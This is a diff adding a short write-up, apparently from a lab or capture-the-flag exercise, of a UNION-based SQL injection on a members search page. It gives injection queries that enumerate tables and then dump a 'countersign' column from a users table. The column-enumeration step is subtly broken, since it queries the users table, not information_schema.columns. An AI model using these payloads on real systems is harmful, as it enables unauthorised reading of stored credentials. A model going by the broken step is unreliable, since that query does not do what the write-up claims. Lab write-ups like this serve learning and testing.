@@ -1,0 +1,19 @@
+Steps:
+        ### Go to members page ###
+                - Search for an id
+
+        ### Get the names of tables and dbs ###
+                Query: 1 or 1=1 UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.tables
+                The targeted db and table: Member_Sql_Injection, users
+
+        ### Get the columns in dbs ###
+                Query: 1 or 1=1 UNION SELECT TABLE_SCHEMA, COLUMN_NAME FROM Member_Sql_Injection.users
+                The targeted column: Commentaire, countersign
+
+Injection query: 1 or 1=1 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users
+
+Vulenrability name: SQL INJECTION
+
+Vulenrability desc: SQL injection is a web security vulnerability that allows an attacker to
+                    interfere with the queries that an application makes to its database.
+                    It generally allows an attacker to view data that they are not normally able to retrieve
